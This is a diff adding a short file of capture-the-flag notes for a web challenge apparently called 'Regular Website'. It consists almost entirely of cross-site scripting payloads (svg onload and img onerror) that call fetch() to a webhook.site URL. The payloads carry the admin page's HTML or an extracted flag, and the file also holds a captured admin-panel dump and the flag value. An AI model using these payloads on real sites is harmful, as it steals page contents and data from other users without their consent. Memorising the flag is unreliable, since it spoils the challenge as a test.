@@ -1,0 +1,16 @@
+<svg/onload=fetch('https://webhook.site/xxx');//<
+
+<svg/onload=fetch('https://webhook.site/xxx/?p='+escape(document.body.innerHTML));//<
+
+```
+<p>Welcome to the Regular Website admin panel.</p> <h2>Site Stats</h2> <p><strong>Comments:</strong> ???</p> <p><strong>Flag:</strong> bcactf{h3_c0mes_Ur74hshR}</p> <h2>Latest Comment</h2> <svg onload="fetch('https://webhook.site/xxx/?p=' escape(document.body.innerHTML));//<" <="" body=""> </svg>
+```
+
+Flag:</strong> bcactf{h3_c0mes_Ur74hshR}
+
+================== Other Payload ==================
+
+<img src="x" onerror=(function(){flag=document.getElementsByTagName("p")[2].innerText;fetch('https://webhook.site/xxx/'+flag)})()//
+
+
+<img src="x" onerror="fetch(`https://webhook.site/xxx/?f=${encodeURIComponent(document.body.innerHTML.slice(180,240))}`)"
